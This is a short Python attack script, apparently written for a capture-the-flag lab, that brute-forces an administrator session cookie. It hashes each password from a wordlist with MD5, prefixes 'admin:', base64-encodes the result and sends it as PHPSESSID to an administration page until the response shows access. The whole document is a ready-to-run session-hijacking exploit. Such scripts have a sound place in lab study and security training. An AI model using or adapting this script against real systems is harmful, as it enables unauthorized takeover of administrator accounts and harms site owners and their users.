import base64
import hashlib
import requests

passwords = []
URL = "http://10.10.163.122/administration.php"
#Replace the IP aove with the target IP

print("Please wait while I brutefoce a valid session cookie for you....^^")

with open("/home/kali/Desktop/hijack2/passwords_list.txt",'r') as contents:
#Replace the wordlist location with your own wordlist location
        for line in contents:
                stripped_line = line.strip()
                stripped_line_append = passwords.append(stripped_line)

for eachPass in passwords:
        md5Hash= hashlib.md5(eachPass.encode('utf-8')).hexdigest().encode('utf-8')
        finalHash = b'admin:' + md5Hash
        vsh = base64.b64encode(finalHash).decode()
        headers = { "Cookie": f"PHPSESSID={vsh}" }
        response = requests.get(URL, headers=headers)
        if "Administration" in response.text:
                print("Success")
                print("Valid cookie for hijacking: " + vsh)
                break